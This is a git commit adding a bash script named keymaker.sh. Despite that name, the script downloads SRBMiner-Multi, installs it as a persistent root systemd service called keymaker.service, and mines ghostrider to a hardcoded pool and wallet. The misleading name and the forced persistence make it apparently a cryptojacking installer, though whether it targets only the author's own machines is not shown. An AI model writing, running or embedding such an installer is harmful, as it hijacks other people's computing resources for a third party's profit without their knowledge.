a63607efe3861bb267d55bf032d9fe76cde11aa4
abdul <34927384+cecepabdul@users.noreply.github.com>
2024-07-13 08:30:32 +0700

    Create keymaker.sh

---
+++ keymaker.sh
@@ -0,0 +1,40 @@
+#!/bin/bash
+
+if [ ! -f "/root/SRBMiner-Multi-2-5-9/SRBMiner-MULTI" ]; then
+    # File cpuminer doesn't exist, perform installation
+    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.9/SRBMiner-Multi-2-5-9-Linux.tar.gz
+    tar -xvf SRBMiner-Multi-2-5-9-Linux.tar.gz
+    cd SRBMiner-Multi-2-5-9
+fi
+
+# Step 2: Create systemd configuration file srb.service
+sudo tee /etc/systemd/system/keymaker.service <<EOF
+[Unit]
+Description=SRBMiner-MULTI Service
+After=network.target
+
+[Service]
+ExecStart=/root/SRBMiner-Multi-2-5-9/SRBMiner-MULTI --disable-gpu --algorithm ghostrider --pool us.getablocks.com:1090 --wallet kckdvRwhQSKehTa8dbdFYAJGj8hiTxQ4yW --password x
+WorkingDirectory=/root
+Restart=always
+RestartSec=3
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Step 3: Set permissions on the configuration file
+sudo chmod 644 /etc/systemd/system/keymaker.service
+
+# Step 4: Reload systemd configuration
+sudo systemctl daemon-reload
+
+# Step 5: Start the srb service
+sudo systemctl start keymaker.service
+
+# Wait for 10 seconds
+sleep 10
+
+# Check the status of the srb service
+journalctl -f -u keymaker.service
